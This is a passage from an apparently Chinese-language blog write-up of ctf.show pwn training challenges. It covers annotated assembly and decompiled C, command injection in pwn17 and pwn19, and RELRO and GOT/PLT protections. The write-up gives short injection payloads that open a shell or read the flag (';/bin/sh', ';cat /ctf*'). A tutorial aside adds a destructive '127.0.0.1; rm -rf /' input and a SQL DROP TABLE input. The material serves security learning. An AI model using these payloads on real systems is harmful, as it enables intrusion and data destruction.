恢复栈帧.cfi_def_cfa 7, 8  # 更新CFAret  # 返回.cfi_endproc  # 表示函数的结束.LFE0:.sizectfshow, .-ctfshow  # 指定ctfshow函数的大小.section.rodata  # 指定接下来的部分为只读数据段.LC1:.string"%2hhx"  # 定义一个字符串"%2hhx"    .text  # 回到代码段.globlmain  # 定义一个全局函数main.typemain, @function  # 指定main的类型为函数main:  # main函数的开始.LFB1:.cfi_startproc  # 表示函数的开始pushq%rbp  # 保存基指针.cfi_def_cfa_offset 16  # 更新CFA（Canonical Frame Address）偏移量.cfi_offset 6, -16  # 保存%rbp的旧值movq%rsp, %rbp  # 将栈指针的值赋给基指针.cfi_def_cfa_register 6  # 更新CFA的基准寄存器subq$64, %rsp  # 为局部变量分配空间movq%fs:40, %rax  # 从线程局部存储（TLS）中读取栈保护器的值movq%rax, -8(%rbp)  # 将栈保护器的值保存到局部变量中xorl%eax, %eax  # 将%eax清零movabsq$4122593792332543030, %rax  # 将一个64位的常数加载到%rax中movabsq$3834596513518335287, %rdx  # 将另一个64位的常数加载到%rdx中movq%rax, -32(%rbp)  # 将%rax的值保存到局部变量中movq%rdx, -24(%rbp)  # 将%rdx的值保存到局部变量中movl$825635894, -16(%rbp)  # 将一个32位的常数保存到局部变量中movb$0, -12(%rbp)  # 将一个字节的0保存到局部变量中movl$0, -52(%rbp)  # 初始化一个局部变量为0jmp.L5  # 跳转到.L5标签.L6:leaq-48(%rbp), %rdx  # 将一个局部变量的地址加载到%rdx中movl-52(%rbp), %eax  # 将局部变量的值加载到%eax中cltq  # 将%eax的值符号扩展到64位addq%rax, %rdx  # 将%rax和%rdx的值相加movl-52(%rbp), %eax  # 将局部变量的值加载到%eax中addl%eax, %eax  # 将%eax的值加倍leaq-32(%rbp), %rcx  # 将另一个局部变量的地址加载到%rcx中cltq  # 将%eax的值符号扩展到64位addq%rcx, %rax  # 将%rcx和%rax的值相加leaq.LC1(%rip), %rsi  # 将字符串"%2hhx"的地址加载到%rsi中movq%rax, %rdi  # 将%rax的值赋给%rdimovl$0, %eax  # 将%eax清零，因为__isoc99_sscanf函数的浮点参数数量是通过%eax传递的call__isoc99_sscanf@PLT  # 调用__isoc99_sscanf函数，将一个字节的十六进制数转换为字符addl$1, -52(%rbp)  # 将局部变量加1.L5:cmpl$15, -52(%rbp)  # 检查局部变量是否小于等于15jle.L6  # 如果是，跳转到.L6标签leaq-48(%rbp), %rax  # 将一个局部变量的地址加载到%rax中movq%rax, %rdi  # 将%rax的值赋给%rdicallctfshow  # 调用ctfshow函数，打印字符串movl$0, %eax  # 将%eax清零，表示main函数的返回值为0movq-8(%rbp), %rsi  # 将保存的栈保护器的值加载到%rsi中xorq%fs:40, %rsi  # 将%rsi的值与TLS中的栈保护器的值进行异或操作je.L8  # 如果结果为0，跳转到.L8标签call__stack_chk_fail@PLT  # 如果结果不为0，调用__stack_chk_fail函数，表示栈溢出.L8:leave  # 恢复栈帧.cfi_def_cfa 7, 8  # 更新CFAret  # 返回.cfi_endproc  # 表示函数的结束.LFE1:.sizemain, .-main  # 指定main函数的大小.ident"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"  # 指定编译器的版本信息.section.note.GNU-stack,"",@progbits  # 指定接下来的部分为GNU堆栈段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反汇编C源代"><a href="#反汇编C源代" class="headerlink" title="反汇编C源代"></a>反汇编C源代</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)  // 主函数{  int i;  // 定义一个整型变量i  char v5[16];  // 定义一个长度为16的字符数组v5  char v6[24];  // 定义一个长度为24的字符数组v6  unsigned __int64 v7;  // 定义一个64位无符号整型变量v7  v7 = __readfsqword(0x28u);  // 从线程局部存储（TLS）中读取栈保护器的值  strcpy(v6, "64616e69756e69756461");  // 将字符串"64616e69756e69756461"复制到v6中  for ( i = 0; i &lt;= 15; ++i )  // 对于i从0到15  {    argv = (const char **)"%2hhx";  // 将argv指向字符串"%2hhx"    __isoc99_sscanf(&amp;v6[2 * i], "%2hhx", &amp;v5[i]);  // 从v6中读取一个字节的十六进制数，并将其转换为字符存储到v5中  }  ctfshow(v5, argv);  // 调用ctfshow函数，打印v5中的字符串  return 0;  // 返回0}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __fastcall ctfshow(__int64 a1)  // ctfshow函数，参数是一个64位整数a1，表示一个内存地址{  int i;  // 定义一个整型变量i  printf("ctfshow{");  // 打印字符串"ctfshow{"  for ( i = 0; i &lt;= 15; ++i )  // 对于i从0到15    putchar(*(unsigned __int8 *)(i + a1));  // 从内存地址a1+i处读取一个字符，并打印出来  return putchar(125);  // 打印字符'}'，并返回其ASCII值（125）}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、pwn17"><a href="#五、pwn17" class="headerlink" title="五、pwn17"></a>五、pwn17</h2><h3 id="C源代码"><a href="#C源代码" class="headerlink" title="C源代码"></a>C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) // 主函数，程序的入口点{  int v4; // 定义一个整型变量v4，用于存储用户的输入  char dest[4]; // 定义一个字符数组dest，大小为4，用于存储命令  char buf[10]; // 定义一个字符数组buf，大小为10，用于存储用户的输入  unsigned __int64 v7; // 定义一个无符号64位整型变量v7  v7 = __readfsqword(0x28u); // 读取FS段寄存器的值，这是一种防止缓冲区溢出的保护机制  setvbuf(_bss_start, 0LL, 2, 0LL); // 设置_bss_start的缓冲区模式为_IONBF，即不进行缓冲  setvbuf(stdin, 0LL, 1, 0LL); // 设置stdin的缓冲区模式为_IONBF，即不进行缓冲  puts(asc_D48); // 输出字符串asc_D48  puts(asc_DC0); // 输出字符串asc_DC0  puts(asc_E40); // 输出字符串asc_E40  puts(asc_ED0); // 输出字符串asc_ED0  puts(asc_F60); // 输出字符串asc_F60  puts(asc_FE8); // 输出字符串asc_FE8  puts(asc_1080); // 输出字符串asc_1080  puts("    * *************************************                           "); // 输出字符串  puts(aClassifyCtfsho); // 输出字符串aClassifyCtfsho  puts("    * Type  : Linux_Security_Mechanisms                               "); // 输出字符串  puts("    * Site  : https://ctf.show/                                       "); // 输出字符串  puts("    * Hint  : You should understand the basic command usage of Linux! "); // 输出字符串  puts("    * *************************************                           "); // 输出字符串  *(_DWORD *)dest = 790655852; // 将整数790655852转换为字符数组存储在dest中  v4 = 0; // 初始化v4为0  puts("\nHow much do you know about Linux commands? \n"); // 输出提示信息  while ( 1 ) // 进入无限循环  {    menu(); // 调用menu函数，显示菜单    v4 = 0; // 将v4重置为0    puts("\nEnter the command you want choose:(1.2.3.4 or 5)\n"); // 输出提示信息    __isoc99_scanf("%d", &amp;v4); // 读取用户的输入，存储在v4中    switch ( v4 ) // 根据v4的值执行不同的命令    {      case 1:        system("id"); // 执行id命令，显示当前用户的信息        break;      case 2:        puts("Which directory?('/','./' or the directiry you want?)"); // 输出提示信息        read(0, buf, 0xAuLL); // 读取用户的输入，存储在buf中        strcat(dest, buf); // 将buf中的字符串追加到dest中        system(dest); // 执行dest中的命令        puts("Execution succeeded!"); // 输出执行成功的信息        break;      case 3:        sleep(1u); // 等待1秒        puts("$cat /ctfshow_flag"); // 输出字符串        sleep(1u); // 等待1秒        puts("ctfshow{"); // 输出字符串        sleep(2u); // 等待2秒        puts("... ..."); // 输出字符串        sleep(3u); // 等待3秒        puts("Your flag is ..."); // 输出字符串        sleep(5u); // 等待5秒        puts("ctfshow{flag is not here!}"); // 输出字符串        sleep(0x14u); // 等待20秒        puts("wtf?You haven't left yet?\nOk~ give you flag:\nflag is loading......"); // 输出字符串        sleep(0x1BF52u); // 等待114194秒        system("cat /ctfshow_flag"); // 执行命令，显示flag        break;      case 4:        sleep(2u); // 等待2秒        puts("su: Authentication failure"); // 输出字符串        break;      case 5:        puts("See you!"); // 输出字符串        exit(-1); // 退出程序      default:        puts("command not found!"); // 如果v4的值不是1-5，输出命令未找到的信息        break;    }  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1.根据执行的结果，将相应的提示信息赋值给变量 v4。</p><p>2.根据执行的结果，输出相应的提示信息。</p><p>可以看到在选项3最后会执行system(“cat /ctfshow_flag”);命令，虽然最终能达到我们想要的效</p><p>果，但是它sleep了很久很久，本地等的话没什么问题，但是远程环境并没有这么久，因此这</p><p>条直接pass，其他1/4/5选项都没有实质性作用，但是2那里会有问题，我们可以进行拼接，限</p><p>制了10字节</p><p>但是我们完全够用，可以构造出 “;cat /ctf*” “;/bin/sh”等</p><p>直接拿取一个shell或者直接读出flag</p><p>在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。</p><p>所以cat /ctf*能够读到flag</p><h2 id="3-；bin-x2F-sh（命令注入漏洞产生原因）"><a href="#3-；bin-x2F-sh（命令注入漏洞产生原因）" class="headerlink" title="3.；bin/sh（命令注入漏洞产生原因）"></a>3.；bin/sh（命令注入漏洞产生原因）</h2><p>在这个程序中，用户的输入被直接用于构造并执行系统命令，这是一个典型的命令注入漏洞。</p><p>具体来说，当用户选择选项2并输入一个目录名时，程序会将用户的输入追加到<code>dest</code>字符串中，然后执行<code>system(dest)</code>。<code>system()</code>函数会执行参数中的字符串作为命令。因为程序没有对用户的输入进行任何过滤或检查，所以用户可以输入一些特殊的字符串，如“;cat /ctf*”或“;/bin/sh”，来执行任意命令。</p><p>这是因为在Linux中，分号（;）用于分隔多个命令，所以用户可以通过输入包含分号的字符串来执行多个命令。此外，用户的输入并没有长度限制，所以用户可以输入任意长度的命令。</p><p>因此，这个程序没有正确地处理用户的输入，允许用户通过输入特殊的字符串来执行任意命令。这是一个典型的命令注入攻击。</p><h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">read(0, buf, 0xAuLL); // 读取用户的输入，存储在buf中 strcat(dest, buf); // 将buf中的字符串追加到dest中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是一个在C语言中常见的从用户接收输入并执行命令的模式。下面是每个命令的详细解析：</p><ol><li><p><code>read(0, buf, 0xAuLL);</code></p><p><code>read</code> 是一个系统调用，用于从文件描述符中读取数据。在这里，<code>0</code> 是文件描述符，代表标准输入（stdin），<code>buf</code> 是一个字符数组，用于存储从标准输入读取的数据，<code>0xAuLL</code> 是要读取的字节数，这里是16进制的<code>A</code>，转换为十进制就是10，所以这个命令会从标准输入读取10个字节的数据，存储在<code>buf</code>中。</p></li><li><p><code>strcat(dest, buf);</code></p><p><code>strcat</code> 是一个标准库函数，用于将两个字符串连接起来。在这里，<code>dest</code> 是目标字符串，<code>buf</code> 是源字符串，这个命令会将<code>buf</code>中的字符串追加到<code>dest</code>的末尾。需要注意的是，<code>strcat</code> 不会检查<code>dest</code>是否有足够的空间来存储结果，如果<code>dest</code>的空间不足，就会发生缓冲区溢出，这可能导致程序崩溃或者被攻击者利用。</p></li><li><p><code>system(dest);</code></p><p><code>system</code> 是一个标准库函数，用于执行一个系统命令。在这里，<code>dest</code> 是要执行的命令，这个命令会被传递给系统的命令解释器（通常是<code>/bin/sh</code>或者<code>cmd.exe</code>），命令解释器会执行这个命令，然后返回结果。需要注意的是，<code>system</code> 函数会执行任何传递给它的命令，如果这个命令是由用户提供的，那么用户就可以执行任意的系统命令，这可能导致安全问题。</p></li><li><p>0xAuLL</p><p>在C语言中，<code>0xAuLL</code>是一个无符号长长整型（unsigned long long）常量的表示方法。这里的<code>0xA</code>是一个十六进制的数，等于十进制的10。<code>u</code>和<code>LL</code>是后缀，用来指定这个常量的类型。</p><ul><li><code>u</code>或<code>U</code>后缀表示这是一个无符号（unsigned）整数。无符号整数只能表示非负数。</li><li><code>LL</code>或<code>ll</code>后缀表示这是一个长长整型（long long）整数。在大多数系统中，长长整型整数至少有64位。</li></ul><p>所以，<code>0xAuLL</code>表示的是一个无符号长长整型整数，值为10。</p></li></ol><h2 id="4、命令注入漏洞补充"><a href="#4、命令注入漏洞补充" class="headerlink" title="4、命令注入漏洞补充"></a>4、命令注入漏洞补充</h2><p>命令注入漏洞是一种常见的安全漏洞，它存在于当应用程序将不可信的输入用作命令或参数并执行时。除了上述的例子，还有许多其他的命令注入漏洞的例子，包括：</p><ol><li><p><strong>Shell命令注入</strong>：这是最常见的命令注入漏洞类型。如果应用程序使用用户提供的输入构建并执行shell命令，那么攻击者可以通过提供包含额外命令的输入来执行任意命令。例如，如果应用程序使用<code>system("ping " + user_input)</code>来执行ping命令，那么攻击者可以提供<code>"127.0.0.1; rm -rf /"</code>作为输入，这将导致应用程序执行<code>rm -rf /</code>命令，删除所有文件。</p></li><li><p><strong>SQL命令注入</strong>：这是另一种常见的命令注入漏洞类型。如果应用程序使用用户提供的输入构建并执行SQL命令，那么攻击者可以通过提供包含额外命令的输入来执行任意SQL命令。例如，如果应用程序使用<code>"SELECT * FROM users WHERE name = '" + user_input + "'"</code>来查询用户，那么攻击者可以提供<code>"'; DROP TABLE users; --"</code>作为输入，这将导致应用程序执行<code>DROP TABLE users</code>命令，删除users表。</p></li><li><p><strong>LDAP命令注入</strong>：如果应用程序使用用户提供的输入构建并执行LDAP（轻量级目录访问协议）查询，那么攻击者可以通过提供包含额外命令的输入来执行任意LDAP查询。</p></li><li><p><strong>OS命令注入</strong>：这是一种更广泛的命令注入漏洞类型，包括shell命令注入。如果应用程序使用用户提供的输入构建并执行操作系统命令，那么攻击者可以通过提供包含额外命令的输入来执行任意操作系统命令。</p></li></ol><p>防止命令注入的最佳实践是永远不要使用用户提供的输入构建并执行命令。如果必须这样做，那么应该使用参数化的接口，并对用户的输入进行严格的验证和过滤。</p><h2 id="六、pwn018"><a href="#六、pwn018" class="headerlink" title="六、pwn018"></a>六、pwn018</h2><h3 id="echo-‘flag-is-here’-gt-gt-x2F-ctfshow-flag中-gt-gt-和-gt-的区别"><a href="#echo-‘flag-is-here’-gt-gt-x2F-ctfshow-flag中-gt-gt-和-gt-的区别" class="headerlink" title="echo ‘flag is here’ >> /ctfshow_flag中>>和>的区别"></a>echo ‘flag is here’ &gt;&gt; /ctfshow_flag中&gt;&gt;和&gt;的区别</h3><ol><li><code>echo 'flag is here' &gt;&gt; /ctfshow_flag</code>：这个命令会将字符串 <code>'flag is here'</code> 追加到文件 <code>/ctfshow_flag</code> 的末尾。如果文件 <code>/ctfshow_flag</code> 不存在，那么这个命令会创建这个文件。如果文件已经存在，那么这个命令不会覆盖文件的原有内容，而是在原有内容后面添加新的内容。</li><li><code>echo 'flag is here' &gt; /ctfshow_flag</code>：这个命令会将字符串 <code>'flag is here'</code> 写入文件 <code>/ctfshow_flag</code>。如果文件 <code>/ctfshow_flag</code> 不存在，那么这个命令会创建这个文件。如果文件已经存在，那么这个命令会覆盖文件的原有内容，只保留新的内容。</li></ol><p>所以，这两个命令的主要区别在于 <code>&gt;&gt;</code> 是追加内容，而 <code>&gt;</code> 是覆盖内容。</p><h2 id="七、pwn019"><a href="#七、pwn019" class="headerlink" title="七、pwn019"></a>七、pwn019</h2><h3 id="1-C源代码"><a href="#1-C源代码" class="headerlink" title="1.C源代码"></a>1.C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf[40]; // [rsp+10h] [rbp-30h] BYREF  unsigned __int64 v5; // [rsp+38h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 1, 0LL);  puts(s);  puts(asc_BF0);  puts(asc_C70);  puts(asc_D00);  puts(asc_D90);  puts(asc_E18);  puts(asc_EB0);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Turn off output, how to get flag? ");  puts("    * *************************************                           ");  if ( fork() )  {    wait(0LL);    sleep(3u);    printf("flag is not here!");  }  else  {    puts("give you a shell! now you need to get flag!");    fclose(_bss_start);    read(0, buf, 0x20uLL);    system(buf);  }  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-关闭输出流，标准输出重定向到输入（绕过）"><a href="#2-关闭输出流，标准输出重定向到输入（绕过）" class="headerlink" title="2.关闭输出流，标准输出重定向到输入（绕过）"></a>2.关闭输出流，标准输出重定向到输入（绕过）</h3><ol><li><p>fclose() : 关闭文件输出流。</p></li><li><p>read(0, &amp;buf, 0x20uLL) : 从标准输入中读取用户输入的命令，并存储在 buf 中。</p></li><li><p>system(&amp;buf) : 执行用户输入的命令。</p></li></ol><p>我们可以使用了 exec 函数来执行 sh 命令，并使用 1&gt;&amp;0 来进行输出重定向。这个命令将标准输出</p><p>重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p><p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可</p><p>以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，</p><p>可以在该环境中执行命令并与用户进行交互。</p><p>这里限制了20个字节，反弹shell</p><p>也可以直接exec cat /ctf* 1&gt;&amp;0 将 cat /ctf* 命令的输出发送到标准输入，实际上就是将命令的输</p><p>出再次输出到屏幕上。</p><p>的话理论上也可行，感兴趣的可以自行去尝试。</p><h3 id="3-bash、sh和bin-x2F-sh区别"><a href="#3-bash、sh和bin-x2F-sh区别" class="headerlink" title="3.bash、sh和bin/sh区别"></a>3.bash、sh和bin/sh区别</h3><p><code>sh</code>和<code>/bin/sh</code>基本上是指向同一个东西，都是指向shell，但是在某些系统中，它们可能会有所不同。</p><p><code>sh</code>是一个shell，也就是命令行解释器，它读取和执行用户输入的命令或者脚本文件中的命令。<code>sh</code>通常指向系统默认的shell。</p><p><code>/bin/sh</code>是一个路径，它指向的是文件系统中<code>/bin</code>目录下的<code>sh</code>程序。在很多Unix和类Unix系统中，<code>/bin/sh</code>通常是一个指向Bourne shell或者与Bourne shell兼容的shell（如Bash，Dash等）的符号链接。</p><p>在某些系统中，<code>sh</code>和<code>/bin/sh</code>可能会指向不同的shell。例如，在一些系统中，<code>sh</code>可能会指向用户默认的shell（这可以是Bash，Zsh，Ksh，Csh等），而<code>/bin/sh</code>则始终指向Bourne shell或者与Bourne shell兼容的shell。</p><p>所以，<code>sh</code>和<code>/bin/sh</code>是否完全一样，取决于具体的系统配置。在大多数情况下，你可以认为它们是一样的，但在某些特定的系统或者配置中，它们可能会有所不同。</p><p>Bash（Bourne Again SHell）是一个为GNU项目开发的Unix shell，由Brian Fox在1989年创建。它是Bourne Shell（sh）的替代品，包含了更多的特性，例如命令行编辑、命令历史、命令别名、作业控制等。</p><p>在很多现代的Unix和类Unix系统（如Linux和macOS）中，Bash是默认的shell。这意味着当你打开一个终端窗口或者运行一个shell脚本时，你通常会使用Bash。</p><p><code>/bin/sh</code>在很多系统中是指向Bash或者其他与Bourne Shell兼容的shell（如Dash）的符号链接。这意味着当你运行<code>/bin/sh</code>或者<code>sh</code>时，你实际上可能是在运行Bash或者其他与Bourne Shell兼容的shell。</p><p>然而，当Bash作为<code>/bin/sh</code>运行时，它会启动一个特殊的兼容模式，这个模式下Bash会尽可能地模仿Bourne Shell的行为，并且禁用一些Bash的特性。这是为了确保<code>/bin/sh</code>脚本在不同的系统上的行为是一致的，即使这些系统使用不同的shell。</p><p>所以，Bash和<code>sh</code>、<code>/bin/sh</code>的关系是：Bash是一个更强大的shell，它包含了Bourne Shell的所有特性并且添加了更多的特性。在很多系统中，<code>sh</code>和<code>/bin/sh</code>实际上就是Bash，但是当Bash作为<code>sh</code>或者<code>/bin/sh</code>运行时，它会模仿Bourne Shell的行为。</p><h2 id="八、pwn20"><a href="#八、pwn20" class="headerlink" title="八、pwn20"></a>八、pwn20</h2><h3 id="objdump-R-pwn020"><a href="#objdump-R-pwn020" class="headerlink" title="objdump -R pwn020"></a>objdump -R pwn020</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230718234651649.png" alt="image-20230718234651649"></p><h3 id="1、RELRO"><a href="#1、RELRO" class="headerlink" title="1、RELRO"></a>1、RELRO</h3><p>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。它主要</p><p>通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure Linkage</p><p>Table，简称 PLT）的可写性来防止针对这些结构的攻击。RELRO保护有三种状态：</p><ol><li>No RELRO：在这种状态下，GOT和PLT都是可写的，意味着攻击者可以修改这些表中的指</li></ol><p>针，从而进行攻击。这是最弱的保护状态。</p><ol start="2"><li>Partial RELRO：在这种状态下，GOT的开头部分被设置为只读（RO），而剩余部分仍然可</li></ol><p>写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p><ol start="3"><li>Full RELRO：在这种状态下，GOT和PLT都被设置为只读（RO）。这样做可以防止对这些结构</li></ol><p>的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p><h3 id="2、got表和plt表"><a href="#2、got表和plt表" class="headerlink" title="2、got表和plt表"></a>2、got表和plt表</h3><p>题目中的.got表和.got.plt表是在Linux下的动态链接机制中的两个重要部分，它们分别是全局偏移表(Global Offset Table, GOT)和过程链接表(Procedure Linkage Table, PLT)。</p><ol><li>.got表(Global Offset Table)：这是一个由系统动态链接器创建的表，用于存储动态链接库函数的实际运行时地址。当程序调用一个库函数时，它会通过.got表找到这个函数在内存中的实际地址，然后跳转到那里执行。这个表在程序运行时是可写的，因为动态链接器需要在运行时填充这个表。</li><li>.got.plt表(Procedure Linkage Table)：这是一个由编译器创建的表，用于存储程序中每个库函数的”跳板”地址。当程序第一次调用一个库函数时，它会跳转到.got.plt表中的对应项，然后通过一个”跳板”函数跳转到动态链接器，由动态链接器查找函数的实际地址，填充到.got表中，然后跳转到那里执行。这个表在程序运行时通常是不可写的，因为一旦填充完成，就不需要再修改了。</li></ol><h3 id="3-objdump-R-pwn020"><a href="#3-objdump-R-pwn020" class="headerlink" title="3.objdump -R  pwn020"></a>3.objdump -R  pwn020</h3><ul><li><code>R_X86_64_GLOB_DAT</code> 类型的记录通常用于全局数据的重定位，对应的是 <code>.got</code> 表。在程序运行时，动态链接器需要在运行时填充这个表，因此 <code>.got</code> 表是可写的。</li><li><code>R_X86_64_JUMP_SLOT</code> 类型的记录通常用于函数的重定位，对应的是 <code>.got.plt</code> 表。这个表在程序运行时通常是不可写的，因为一旦填充完成，就不需要再修改了。</li></ul><h3 id="4-readelf-S-pwn020-section"><a href="#4-readelf-S-pwn020-section" class="headerlink" title="4.readelf -S pwn020  (section)"></a>4.readelf -S pwn020  (section)</h3><p><code>readelf -S pwn020</code> 命令的输出显示了 <code>pwn020</code> 这个 ELF 文件的节区头部表（Section Header Table）。这个表包含了文件中所有节区（section）的信息，包括它们的名字、类型、大小、地址等。</p><h2 id="九、pwn021"><a href="#九、pwn021" class="headerlink" title="九、pwn021"></a>九、pwn021</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230719014140979.png" alt="image-20230719014140979"></p><h3 id="1-checksec-pwn021"><a href="#1-checksec-pwn021" class="headerlink" title="1.checksec pwn021"></a>1.checksec pwn021</h3><p>发现 Partial RELRO</p><h3 id="2-objdump-R-pwn021"><a href="#2-objdump-R-pwn021" class="headerlink" title="2.objdump -R pwn021"></a>2.objdump -R pwn021</h3><p>检查got和got.ptl是否存在</p><h3 id="3-readelf-l-pwn021"><a href="#3-readelf-l-pwn021" class="headerlink" title="3.readelf  -l  pwn021"></a>3.readelf  -l  pwn021</h3><p>我们可以看到 <code>.got</code> 节被映射到了<strong>第三个段</strong>，这个段具有读写权限。这就是我们判断 <code>.got</code> 是可写的依据。</p><p>然而，我们也可以看到 <code>.got</code> 节被映射到了 <code>GNU_RELRO</code> 段。<code>GNU_RELRO</code> 段是一个<strong>标记段</strong>，它标记了一部分内存区域在程序开始运行后应该被设置为<strong>只读</strong>。这就是为什么 <code>.got</code> 在程序开始运行后会变为只读的原因。</p><h4 id="1-计算GNU-RELRO-段中只读地址范围"><a href="#1-计算GNU-RELRO-段中只读地址范围" class="headerlink" title="1.计算GNU_RELRO 段中只读地址范围"></a>1.计算<code>GNU_RELRO</code> 段中只读地址范围</h4><p>这里的四个十六进制数值分别代表：</p><ul><li>Offset：文件中的偏移量</li><li>VirtAddr：虚拟内存中的地址</li><li>PhysAddr：物理内存中的地址（对于可执行文件，这通常与虚拟地址相同）</li><li>FileSiz/MemSiz：在文件中的大小/在内存中的大小</li></ul><p><code>GNU_RELRO</code> 段在虚拟内存中的起始地址是 <code>0x0000000000600e10</code>，大小是 <code>0x00000000000001f0</code>。所以，被标记为只读的地址范围是从 <code>0x0000000000600e10</code> 到 <code>0x0000000000600e10 + 0x00000000000001f0</code>。</p><p>注：在计算地址范围时，<code>FileSiz</code> 是指在文件中的大小，而 <code>MemSiz</code> 是指在内存中的大小。在大多数情况下，这两个值是相同的，但在某些情况下，它们可能会有所不同。例如，对于 <code>.bss</code> 段（未初始化的全局变量），在文件中的大小是 0，但在内存中的大小则是实际的变量大小。</p><p>对于 <code>GNU_RELRO</code> 段，我们通常关注的是 <code>MemSiz</code>，因为这个值决定了在内存中哪些地址被标记为只读。在你的例子中，<code>MemSiz</code> 是 <code>0x00000000000001f0</code>，所以被标记为只读的地址范围是从 <code>0x0000000000600e10</code> 到 <code>0x0000000000600e10 + 0x00000000000001f0</code>。</p><h3 id="4、ogjdump-R-pwn022"><a href="#4、ogjdump-R-pwn022" class="headerlink" title="4、ogjdump  -R pwn022"></a>4、ogjdump  -R pwn022</h3><p>600ff0和601020明显是两个不同的页，所以可读可写都可能不同</p><h2 id="十、pwn022"><a href="#十、pwn022" class="headerlink" title="十、pwn022"></a>十、pwn022</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230719015345486.png" alt="image-20230719015345486"></p><h3 id="got-plt不存在的原因"><a href="#got-plt不存在的原因" class="headerlink" title="got.plt不存在的原因"></a>got.plt不存在的原因</h3><p><code>readelf -S pwn022</code> 的输出中，我们可以看到 <code>.got</code> 表存在，但是并没有 <code>.got.plt</code> 表。这意味着 <code>pwn022</code> 这个程序没有 <code>.got.plt</code> 表。</p><p>这可能是因为 <code>pwn022</code> 这个程序在链接时没有使用 <code>-z lazy</code> 选项。默认情况下，GCC 编译器会使用 <code>-z lazy</code> 选项来链接程序，这会导致生成 <code>.got.plt</code> 表。然而，如果程序在链接时使用了 <code>-z now</code> 选项，那么就不会生成 <code>.got.plt</code> 表，所有的函数调用都会直接通过 <code>.got</code> 表进行。</p><p>所以，虽然 <code>objdump -R pwn022</code> 的输出显示有 <code>R_X86_64_JUMP_SLOT</code> 类型的记录，这通常对应 <code>.got.plt</code> 表，但是实际上 <code>pwn022</code> 这个程序并没有 <code>.got.plt</code> 表。这可能是因为 <code>pwn022</code> 这个程序在链接时使用了 <code>-z now</code> 选项，导致所有的函数调用都直接通过 <code>.got</code> 表进行，而没有使用 <code>.got.plt</code> 表。</p><h2 id="十一、pwn023"><a href="#十一、pwn023" class="headerlink" title="十一、pwn023"></a>十一、pwn023</h2><h3 id="C源代码-1"><a href="#C源代码-1" class="headerlink" title="C源代码"></a>C源代码</h3><h4 id="（一）main函数"><a href="#（一）main函数" class="headerlink" title="（一）main函数"></a>（一）main函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) {  __gid_t v3; // 定义一个组标识符变量  int v5; // 未在代码中使用的整型变量  int v6; // 未在代码中使用的整型变量  int v7; // 未在代码中使用的整型变量  FILE *stream; // 定义一个文件指针  stream = fopen("/ctfshow_flag", 